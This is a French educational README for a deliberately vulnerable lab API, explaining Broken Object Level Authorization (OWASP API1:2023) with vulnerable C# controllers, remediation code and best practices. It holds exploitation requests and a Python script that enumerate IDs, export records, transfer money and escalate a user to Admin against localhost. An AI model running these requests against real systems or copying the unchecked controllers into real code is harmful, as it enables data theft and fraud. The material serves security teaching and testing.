# API1:2023 - Broken Object Level Authorization (BOLA)

## 📋 Description de la vulnérabilité

La vulnérabilité **Broken Object Level Authorization (BOLA)** se produit lorsqu'une API ne vérifie pas correctement si l'utilisateur authentifié a le droit d'accéder à une ressource spécifique. Cette vulnérabilité permet à un attaquant d'accéder à des objets appartenant à d'autres utilisateurs en manipulant simplement les identifiants dans les requêtes API.

### Impact potentiel
- Accès non autorisé aux données d'autres utilisateurs
- Modification ou suppression de données appartenant à d'autres utilisateurs
- Violation de la confidentialité des données
- Exposition d'informations sensibles (données bancaires, médicales, documents confidentiels)

## 🎯 Endpoints vulnérables

Le contrôleur `Api01BolaController` expose plusieurs endpoints vulnérables :

### 1. **Gestion des commandes**
- `GET /api/bola/orders/{orderId}` - Récupère n'importe quelle commande
- `PUT /api/bola/orders/{orderId}/status` - Modifie le statut de n'importe quelle commande
- `DELETE /api/bola/orders/{orderId}` - Supprime n'importe quelle commande

### 2. **Comptes bancaires**
- `GET /api/bola/bank-accounts/{accountId}` - Accède aux informations bancaires
- `PUT /api/bola/bank-accounts/{accountId}/iban` - Modifie l'IBAN
- `DELETE /api/bola/bank-accounts/{accountId}` - Supprime un compte bancaire
- `POST /api/bola/bank-accounts/{accountId}/transfer` - Effectue des transferts

### 3. **Dossiers médicaux**
- `GET /api/bola/medical-records/{recordId}` - Consulte les dossiers médicaux
- `PUT /api/bola/medical-records/{recordId}/notes` - Modifie les notes médicales
- `DELETE /api/bola/medical-records/{recordId}` - Supprime des dossiers médicaux
- `GET /api/bola/medical-records/export?recordIds=[]` - Export en masse
- `GET /api/bola/medical-records/guid/{guid}` - Accès par GUID (tentative de contournement)

### 4. **Documents**
- `GET /api/bola/documents/{documentId}/download` - Télécharge n'importe quel document
- `GET /api/bola/documents/by-slug/{slug}` - Accès aux documents par slug
- `POST /api/bola/documents/{documentId}/share` - Partage de documents
- `DELETE /api/bola/documents/{documentId}` - Supprime des documents

### 5. **Profils utilisateurs**
- `GET /api/bola/users/{userId}/profile` - Accède aux profils complets
- `GET /api/bola/users/me/profile` - Profil de l'utilisateur actuel (sécurisé)
- `PUT /api/bola/users/{userId}/role` - Modifie les rôles utilisateurs

### 6. **Messages et API Keys**
- `GET /api/bola/messages/{messageId}` - Lit les messages privés
- `DELETE /api/bola/messages/{messageId}` - Supprime des messages
- `GET /api/bola/api-keys/{keyId}` - Consulte les clés API
- `POST /api/bola/api-keys/{keyId}/revoke` - Révoque des clés API
- `DELETE /api/bola/api-keys/{keyId}` - Supprime des clés API

## 🔍 Code vulnérable expliqué

### Exemple 1 : Accès aux commandes sans vérification

```csharp
[HttpGet("orders/{orderId}")]
public async Task<IActionResult> GetOrder(int orderId)
{
    // VULNÉRABLE : Aucune vérification que l'utilisateur est propriétaire de la commande
    var order = await _context.Orders.Include(o => o.User).FirstOrDefaultAsync(o => o.Id == orderId);
    if (order == null) return NotFound();
    return Ok(order);
}
```

**Problème** : Le code récupère directement la commande par son ID sans vérifier si l'utilisateur actuel en est le propriétaire.

### Exemple 2 : Transfert d'argent non autorisé

```csharp
[HttpPost("bank-accounts/{accountId}/transfer")]
public async Task<IActionResult> TransferMoney(int accountId, [FromBody] TransferRequest request)
{
    // VULNÉRABLE : Aucune vérification de propriété du compte source
    var sourceAccount = await _context.BankAccounts.FindAsync(accountId);
    var targetAccount = await _context.BankAccounts.FindAsync(request.TargetAccountId);
    
    sourceAccount.Balance -= request.Amount;
    targetAccount.Balance += request.Amount;
    await _context.SaveChangesAsync();
    
    return Ok(new { message = "Transfer completed" });
}
```

**Problème** : N'importe qui peut initier un transfert depuis n'importe quel compte bancaire.

### Exemple 3 : Modification de rôle utilisateur

```csharp
[HttpPut("users/{userId}/role")]
public async Task<IActionResult> UpdateUserRole(int userId, [FromBody] UpdateRoleRequest request)
{
    // VULNÉRABLE : Permet de modifier le rôle de n'importe quel utilisateur
    var user = await _context.Users.FindAsync(userId);
    if (user == null) return NotFound();
    user.Role = request.NewRole;
    await _context.SaveChangesAsync();
    return Ok(new { message = "Role updated", userId, newRole = request.NewRole });
}
```

## 💥 Scénarios d'exploitation

### Scénario 1 : Vol de données bancaires
```bash
# L'attaquant énumère les comptes bancaires
GET /api/bola/bank-accounts/1
GET /api/bola/bank-accounts/2
GET /api/bola/bank-accounts/3
# ...trouve un compte avec un solde élevé

# Effectue un transfert non autorisé
POST /api/bola/bank-accounts/3/transfer
Content-Type: application/json

{
    "targetAccountId": 999,  # Compte de l'attaquant
    "amount": 10000
}
```

### Scénario 2 : Accès aux dossiers médicaux
```bash
# Export en masse de dossiers médicaux
GET /api/bola/medical-records/export?recordIds=[1,2,3,4,5,6,7,8,9,10]

# Ou utilisation du contournement par GUID
GET /api/bola/medical-records/guid/550e8400-e29b-41d4-a716-446655440000
```

### Scénario 3 : Élévation de privilèges
```bash
# L'attaquant modifie son propre rôle
PUT /api/bola/users/123/role
Content-Type: application/json

{
    "newRole": "Admin"
}
```

### Scénario 4 : Téléchargement de documents confidentiels
```bash
# Énumération de documents
for i in {1..100}; do
    curl -X GET "http://localhost:5000/api/bola/documents/$i/download" \
         -H "Authorization: Bearer [TOKEN]" \
         -o "document_$i.pdf"
done
```

## 🛡️ Solutions de remédiation

### 1. **Implémenter une vérification d'autorisation systématique**

```csharp
[HttpGet("orders/{orderId}")]
public async Task<IActionResult> GetOrder(int orderId)
{
    // SÉCURISÉ : Vérifier l'identité de l'utilisateur
    if (!TokenHelper.TryGetClaimFromBearer<int>(HttpContext, "userId", out var userId))
        return Unauthorized();
    
    var order = await _context.Orders
        .Include(o => o.User)
        .FirstOrDefaultAsync(o => o.Id == orderId && o.UserId == userId);
    
    if (order == null) 
        return NotFound(); // Ne pas révéler si l'ordre existe
    
    return Ok(order);
}
```

### 2. **Utiliser des GUIDs au lieu d'IDs séquentiels**

```csharp
public class Order
{
    public Guid Id { get; set; } = Guid.NewGuid();
    // Rend l'énumération beaucoup plus difficile
}
```

### 3. **Implémenter une politique d'autorisation centralisée**

```csharp
public class ResourceAuthorizationService
{
    private readonly AppDbContext _context;
    
    public async Task<bool> CanAccessOrder(int userId, int orderId)
    {
        return await _context.Orders
            .AnyAsync(o => o.Id == orderId && o.UserId == userId);
    }
    
    public async Task<bool> CanAccessBankAccount(int userId, int accountId)
    {
        return await _context.BankAccounts
            .AnyAsync(a => a.Id == accountId && a.UserId == userId);
    }
}
```

### 4. **Utiliser des attributs d'autorisation personnalisés**

```csharp
[AttributeUsage(AttributeTargets.Method)]
public class RequireResourceOwnerAttribute : TypeFilterAttribute
{
    public RequireResourceOwnerAttribute(string resourceType) 
        : base(typeof(ResourceOwnerFilter)) 
    {
        Arguments = new object[] { resourceType };
    }
}

// Usage
[HttpGet("orders/{orderId}")]
[RequireResourceOwner("Order")]
public async Task<IActionResult> GetOrder(int orderId) { ... }
```

### 5. **Journaliser les tentatives d'accès non autorisé**

```csharp
if (order.UserId != currentUserId)
{
    _logger.LogWarning($"Tentative d'accès non autorisé: Utilisateur {currentUserId} " +
                      $"a tenté d'accéder à la commande {orderId} appartenant à l'utilisateur {order.UserId}");
    
    // Alerter l'équipe de sécurité si nécessaire
    await _securityService.ReportUnauthorizedAccess(currentUserId, "Order", orderId);
    
    return NotFound(); // Ne pas révéler que la ressource existe
}
```

### 6. **Implémenter des contrôles au niveau de la base de données**

```csharp
// Utiliser des vues ou des procédures stockées avec Row-Level Security
public async Task<List<Order>> GetUserOrders(int userId)
{
    return await _context.Orders
        .FromSqlRaw("EXEC GetOrdersForUser @UserId = {0}", userId)
        .ToListAsync();
}
```

## 🔧 Bonnes pratiques

1. **Principe du moindre privilège** : Les utilisateurs ne doivent accéder qu'à leurs propres ressources
2. **Validation côté serveur** : Ne jamais faire confiance aux données client
3. **Tests de sécurité** : Implémenter des tests automatisés pour vérifier les autorisations
4. **Audit trail** : Enregistrer tous les accès aux ressources sensibles
5. **Rate limiting** : Limiter les tentatives d'énumération
6. **Obscurcissement** : Utiliser des identifiants non prédictibles (UUID)
7. **Défense en profondeur** : Combiner plusieurs couches de sécurité

## 📊 Tests de détection

### Test manuel avec cURL
```bash
# Tester l'accès à une commande qui ne nous appartient pas
curl -X GET "http://localhost:5000/api/bola/orders/1" \
     -H "Authorization: Bearer [TOKEN]"

# Tenter de modifier un compte bancaire
curl -X PUT "http://localhost:5000/api/bola/bank-accounts/5/iban" \
     -H "Authorization: Bearer [TOKEN]" \
     -H "Content-Type: application/json" \
     -d '"FR1420041010050500013M02606"'
```

### Script de test automatisé
```python
import requests
import json

def test_bola_vulnerability(base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    vulnerabilities = []
    
    # Test 1: Énumération des commandes
    print("Test 1: Énumération des commandes...")
    for order_id in range(1, 20):
        response = requests.get(f"{base_url}/api/bola/orders/{order_id}", headers=headers)
        if response.status_code == 200:
            vulnerabilities.append(f"Accès non autorisé à la commande {order_id}")
    
    # Test 2: Accès aux comptes bancaires
    print("Test 2: Accès aux comptes bancaires...")
    for account_id in range(1, 20):
        response = requests.get(f"{base_url}/api/bola/bank-accounts/{account_id}", headers=headers)
        if response.status_code == 200:
            vulnerabilities.append(f"Accès non autorisé au compte bancaire {account_id}")
    
    # Test 3: Modification de rôle
    print("Test 3: Tentative de modification de rôle...")
    for user_id in range(1, 10):
        response = requests.put(
            f"{base_url}/api/bola/users/{user_id}/role",
            headers={**headers, "Content-Type": "application/json"},
            data=json.dumps({"newRole": "Admin"})
        )
        if response.status_code == 200:
            vulnerabilities.append(f"Modification de rôle réussie pour l'utilisateur {user_id}")
    
    return vulnerabilities
```

### Utilisation de Burp Suite ou OWASP ZAP

1. Configurer le proxy pour intercepter les requêtes
2. Identifier les paramètres d'ID dans les requêtes
3. Utiliser l'outil "Intruder" pour tester différentes valeurs d'ID
4. Analyser les réponses pour identifier les accès non autorisés

## ⚠️ Attention

Ce code est **intentionnellement vulnérable** et ne doit **JAMAIS** être utilisé en production. Il sert uniquement à des fins éducatives pour comprendre et apprendre à détecter les vulnérabilités BOLA.

## 📚 Références

- [OWASP API Security Top 10 2023](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [OWASP Authorization Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/README)
- [API Security Best Practices](https://owasp.org/www-project-api-security/)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)